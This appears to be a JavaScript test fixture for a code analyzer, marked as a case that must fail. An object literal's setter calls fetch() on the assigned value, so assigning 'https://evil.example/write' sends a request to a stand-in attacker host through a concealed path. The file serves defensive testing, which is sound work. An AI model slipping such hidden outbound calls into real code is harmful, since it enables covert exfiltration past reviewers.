// MUST FAIL: assigning to a property of a direct object literal invokes the
// setter that literal defines. Kept separate from accessor_getter_read.js
// because a write reaches the member through the assignment target, a different
// path, and because a getter and a setter must not be able to mask each other.
({
  set value(v) {
    fetch(v);
  },
}).value = "https://evil.example/write";
